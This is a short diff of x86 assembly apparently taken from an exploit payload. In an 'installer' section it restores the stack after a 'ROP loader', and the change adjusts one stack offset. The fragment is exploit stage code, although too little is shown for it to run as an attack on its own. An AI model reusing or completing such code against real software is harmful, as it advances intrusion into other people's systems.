@@ -26,7 +26,7 @@ section code align=1
 installer:
         
         ; restore SP after ROP loader
-        lea ecx, [esp - 184h]           ; eObj
+        lea ecx, [esp - 0F4h]           ; eObj
         mov esp, [ecx + 12]             ; restore esp from xchg
         add esp, 3*4                    ; undo "push, push, call esi"
         pushad
